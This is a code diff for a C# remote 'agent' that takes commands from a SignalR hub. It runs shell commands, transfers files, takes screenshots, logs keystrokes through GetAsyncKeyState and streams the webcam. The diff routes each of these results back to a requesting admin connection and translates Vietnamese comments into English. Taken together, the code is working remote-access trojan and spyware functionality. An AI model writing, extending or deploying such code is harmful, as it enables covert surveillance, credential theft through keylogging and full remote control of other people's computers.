@@ -15,16 +15,17 @@ namespace AgentApp
 {
     class Program
     {
-        // For Keylogger API
+        // Windows API implementation for Keylogger
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
 
         private static bool _isKeylogging = false;
 
-        // For Webcam Streaming
+        // Variables for Webcam stream handling
         private static VideoCaptureDevice _videoSource;
         private static HubConnection _connection;
         private static bool _firstFrameSent = false;
+        private static string _currentWebcamAdminId = null;
 
         static async Task Main(string[] args)
         {
@@ -49,15 +50,16 @@ namespace AgentApp
                 .WithAutomaticReconnect()
                 .Build();
 
+            // SignalR Connection Event Handlers
             _connection.Closed += async (error) =>
             {
                 Console.WriteLine("Connection lost. Reconnecting...");
-                await Task.Delay(new Random().Next(0, 5) * 1000);
+                await Task.Delay(new Random().Next(0, 5) * 1000); // Random backoff
                 await _connection.StartAsync();
             };
 
-            // Register handlers for Hub commands
-            _connection.On("GetProcessesCommand", async () =>
+            // Register handlers for Hub commands (Process Management)
+            _connection.On<string>("GetProcessesCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: GetProcessesCommand");
                 try
@@ -72,7 +74,7 @@ namespace AgentApp
                         }).ToList();
 
                     var json = JsonSerializer.Serialize(processes);
-                    await _connection.InvokeAsync("SendProcessesResult", "", json);
+                    await _connection.InvokeAsync("SendProcessesResult", adminConnectionId, json);
                 }
                 catch (Exception ex)
                 {
@@ -95,8 +97,8 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: Applications Management ---
-            _connection.On("GetApplicationsCommand", async () =>
+            // Application Management
+            _connection.On<string>("GetApplicationsCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: GetApplicationsCommand");
                 try
@@ -112,7 +114,7 @@ namespace AgentApp
                         }).ToList();
 
                     var json = JsonSerializer.Serialize(apps);
-                    await _connection.InvokeAsync("SendApplicationsResult", "", json);
+                    await _connection.InvokeAsync("SendApplicationsResult", adminConnectionId, json);
                 }
                 catch (Exception ex)
                 {
@@ -134,21 +136,23 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: Power Management ---
+            // System Power Management
             _connection.On("ShutdownCommand", () =>
             {
                 Console.WriteLine("Command Received: ShutdownCommand");
-                try { Process.Start("shutdown.exe", "/s /t 0"); } catch { }
+                try { Process.Start("shutdown.exe", "/s /t 0"); } 
+                catch (Exception ex) { Console.WriteLine($"Shutdown failed: {ex.Message}"); }
             });
 
             _connection.On("RestartCommand", () =>
             {
                 Console.WriteLine("Command Received: RestartCommand");
-                try { Process.Start("shutdown.exe", "/r /t 0"); } catch { }
+                try { Process.Start("shutdown.exe", "/r /t 0"); } 
+                catch (Exception ex) { Console.WriteLine($"Restart failed: {ex.Message}"); }
             });
 
-            // --- NEW: Screen Capture ---
-            _connection.On("TakeScreenshotCommand", async () =>
+            // Screen Capture Management
+            _connection.On<string>("TakeScreenshotCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: TakeScreenshotCommand");
                 try
@@ -174,7 +178,7 @@ namespace AgentApp
                             byte[] imageBytes = ms.ToArray();
                             string base64String = Convert.ToBase64String(imageBytes);
 
-                            await _connection.InvokeAsync("SendScreenshotResult", "", base64String);
+                            await _connection.InvokeAsync("SendScreenshotResult", adminConnectionId, base64String);
                         }
                     }
                 }
@@ -184,15 +188,15 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: File & Directory Manager ---
-            _connection.On<string>("GetDirectoryContentsCommand", async (path) =>
+            // File & Directory Management
+            _connection.On<string, string>("GetDirectoryContentsCommand", async (adminConnectionId, path) =>
             {
                 Console.WriteLine($"Command Received: GetDirectoryContentsCommand for path: '{path}'");
                 try
                 {
                     if (string.IsNullOrWhiteSpace(path))
                     {
-                        // Nếu đường dẫn rỗng, trả về danh sách các Ổ đĩa (Drives)
+                        // Return list of available system drives if path is empty
                         var drives = DriveInfo.GetDrives().Where(d => d.IsReady).Select(d => new
                         {
                             Type = "Drive",
@@ -200,15 +204,15 @@ namespace AgentApp
                             Path = d.Name,
                             Size = d.TotalSize
                         }).ToList();
-
+                        
                         var json = JsonSerializer.Serialize(drives);
-                        await _connection.InvokeAsync("SendDirectoryContentsResult", "", path, json);
+                        await _connection.InvokeAsync("SendDirectoryContentsResult", adminConnectionId, path, json);
                         return;
                     }
 
                     var dirInfo = new DirectoryInfo(path);
                     var list = new System.Collections.Generic.List<object>();
-
+                    
                     try
                     {
                         foreach (var d in dirInfo.GetDirectories())
@@ -219,24 +223,24 @@ namespace AgentApp
                         {
                             list.Add(new { Type = "File", Name = f.Name, Path = f.FullName, Size = f.Length });
                         }
-                    }
+                    } 
                     catch (UnauthorizedAccessException)
                     {
-                        // Bỏ qua lỗi truy cập
+                        // Ignore folders where we don't have access permissions
                         Console.WriteLine("Access denied to some folders.");
                     }
 
                     var jsonStr = JsonSerializer.Serialize(list);
-                    await _connection.InvokeAsync("SendDirectoryContentsResult", "", path, jsonStr);
+                    await _connection.InvokeAsync("SendDirectoryContentsResult", adminConnectionId, path, jsonStr);
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine($"Error getting directory content: {ex.Message}");
-                    await _connection.InvokeAsync("SendDirectoryContentsResult", "", path, "[]");
+                    await _connection.InvokeAsync("SendDirectoryContentsResult", adminConnectionId, path, "[]");
                 }
             });
 
-            _connection.On<string>("DownloadFileCommand", async (filePath) =>
+            _connection.On<string, string>("DownloadFileCommand", async (adminConnectionId, filePath) =>
             {
                 Console.WriteLine($"Command Received: DownloadFileCommand for {filePath}");
                 try
@@ -246,7 +250,7 @@ namespace AgentApp
                         byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
                         string base64Data = Convert.ToBase64String(fileBytes);
                         string fileName = Path.GetFileName(filePath);
-                        await _connection.InvokeAsync("SendFileResult", "", fileName, base64Data);
+                        await _connection.InvokeAsync("SendFileResult", adminConnectionId, fileName, base64Data);
                         Console.WriteLine("File sent successfully.");
                     }
                     else
@@ -275,7 +279,7 @@ namespace AgentApp
                     byte[] fileBytes = Convert.FromBase64String(base64Data);
                     await File.WriteAllBytesAsync(fullPath, fileBytes);
                     Console.WriteLine($"File uploaded and saved to: {fullPath}");
-
+                    
                     // You could optionally send a confirmation back to Admin here
                 }
                 catch (Exception ex)
@@ -284,7 +288,8 @@ namespace AgentApp
                 }
             });
 
-            _connection.On("StartKeyloggerCommand", () =>
+            // Keylogger implementation
+            _connection.On<string>("StartKeyloggerCommand", (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: StartKeyloggerCommand");
                 if (!_isKeylogging)
@@ -326,7 +331,7 @@ namespace AgentApp
                                         else if (key == ConsoleKey.Enter) keyName = "Enter";
                                         else if (key == ConsoleKey.Spacebar) keyName = "Space";
                                         else if (key == ConsoleKey.Tab) keyName = "Tab";
-
+                                        
                                         if (isShift) prefix += "Shift+";
                                         keyOutput = $"[{prefix}{keyName}]";
                                     }
@@ -368,7 +373,7 @@ namespace AgentApp
 
                                     if (!string.IsNullOrEmpty(keyOutput))
                                     {
-                                        await _connection.InvokeAsync("SendKeylogData", "", keyOutput);
+                                        await _connection.InvokeAsync("SendKeylogData", adminConnectionId, keyOutput);
                                     }
                                 }
                             }
@@ -378,14 +383,14 @@ namespace AgentApp
                 }
             });
 
-            _connection.On("StopKeyloggerCommand", () =>
+            _connection.On<string>("StopKeyloggerCommand", (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: StopKeyloggerCommand");
                 _isKeylogging = false;
             });
 
-            // --- NEW: Terminal ---
-            _connection.On<string>("ExecuteTerminalCommand", async (command) =>
+            // Remote Terminal Command Execution
+            _connection.On<string, string>("ExecuteTerminalCommand", async (adminConnectionId, command) =>
             {
                 Console.WriteLine($"Command Received: ExecuteTerminalCommand for: {command}");
                 try
@@ -416,7 +421,7 @@ namespace AgentApp
                             result = "[Command executed with no output]";
                         }
 
-                        await _connection.InvokeAsync("SendTerminalOutput", "", result);
+                        await _connection.InvokeAsync("SendTerminalOutput", adminConnectionId, result);
                     }
                 }
                 catch (Exception ex)
@@ -426,14 +431,14 @@ namespace AgentApp
                 }
             });
 
-            // --- NEW: Webcam Stream ---
-            _connection.On("GetWebcamsCommand", async () =>
+            // Webcam Streaming Implementation
+            _connection.On<string>("GetWebcamsCommand", async (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: GetWebcamsCommand");
                 string json = "[]";
                 try
                 {
-                    // Chạy ngầm trong 1 luồng STA (COM DirectShow yêu cầu) để tránh bị treo cứng (hang/deadlock)
+                    // Run finding hardware in an STA thread to avoid COM Interop freezes/deadlocks
                     Thread t = new Thread(() =>
                     {
                         try
@@ -446,24 +451,28 @@ namespace AgentApp
                             }
                             json = JsonSerializer.Serialize(cameras);
                         }
-                        catch { }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Camera fetch error: {ex.Message}");
+                        }
                     });
                     t.SetApartmentState(ApartmentState.STA);
                     t.Start();
-                    t.Join(5000); // Đợi tối đa 5 giây tránh treo vĩnh viễn
+                    t.Join(5000); // 5 seconds max wait to prevent permanent lock
 
-                    await _connection.InvokeAsync("SendWebcamsResult", "", json);
+                    await _connection.InvokeAsync("SendWebcamsResult", adminConnectionId, json);
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine($"Error getting webcams: {ex.Message}");
-                    await _connection.InvokeAsync("SendWebcamsResult", "", "[]");
+                    await _connection.InvokeAsync("SendWebcamsResult", adminConnectionId, "[]");
                 }
             });
 
-            _connection.On<string>("StartWebcamCommand", (cameraMoniker) =>
+            _connection.On<string, string>("StartWebcamCommand", (adminConnectionId, cameraMoniker) =>
             {
                 Console.WriteLine($"Command Received: StartWebcamCommand for moniker: {cameraMoniker}");
+                _currentWebcamAdminId = adminConnectionId; // Store admin ID for frames
                 try
                 {
                     Thread t = new Thread(() =>
@@ -476,7 +485,7 @@ namespace AgentApp
                                 if (_videoSource == null)
                                 {
                                     var device = videoDevices[0];
-
+                                    
                                     if (!string.IsNullOrEmpty(cameraMoniker))
                                     {
                                         foreach (FilterInfo d in videoDevices)
@@ -499,7 +508,7 @@ namespace AgentApp
                                             }
                                         }
                                     }
-
+                                    
                                     Console.WriteLine($"Found camera: {device.Name}");
                                     _videoSource = new VideoCaptureDevice(device.MonikerString);
                                     if (_videoSource.VideoCapabilities.Length > 0)
@@ -526,7 +535,7 @@ namespace AgentApp
                     });
                     t.SetApartmentState(ApartmentState.STA);
                     t.Start();
-                    t.Join(7000);
+                    t.Join(7000); 
                 }
                 catch (Exception ex)
                 {
@@ -534,9 +543,10 @@ namespace AgentApp
                 }
             });
 
-            _connection.On("StopWebcamCommand", () =>
+            _connection.On<string>("StopWebcamCommand", (adminConnectionId) =>
             {
                 Console.WriteLine("Command Received: StopWebcamCommand");
+                _currentWebcamAdminId = null; // Clear admin ID
                 try
                 {
                     if (_videoSource != null && _videoSource.IsRunning)
@@ -606,11 +616,11 @@ namespace AgentApp
                         if (_connection != null && _connection.State == HubConnectionState.Connected)
                         {
                             // Fire and forget so we don't hold up the camera thread
-                            _ = _connection.InvokeAsync("SendWebcamFrame", "", base64String);
+                            _ = _connection.InvokeAsync("SendWebcamFrame", _currentWebcamAdminId ?? "", base64String);
 
                             if (!_firstFrameSent)
                             {
-                                Console.WriteLine("Connect successed. Camera is now streaming...");
+                                Console.WriteLine("Success! First image frame transmitted. Camera stream active.");
                                 _firstFrameSent = true;
                             }
                         }
@@ -625,8 +635,8 @@ namespace AgentApp
 
         private static void video_VideoSourceError(object sender, VideoSourceErrorEventArgs eventArgs)
         {
-            Console.WriteLine($"[CAMERA LỖI] {eventArgs.Description}");
-            Console.WriteLine("-> NGUYÊN NHÂN THƯỜNG GẶP: Camera đang bị một phần mềm khác sử dụng (VD: Bạn đang mở sẵn app Camera của Windows, OBS, hoặc Zalo/Zoom). Hãy đóng app đó lại!!");
+            Console.WriteLine($"[CAMERA ERROR] {eventArgs.Description}");
+            Console.WriteLine("-> COMMON CAUSE: The camera is currently being used by another application (e.g., Windows Camera app, OBS, Zoom, Skype). Please close the other application!");
         }
     }
 }
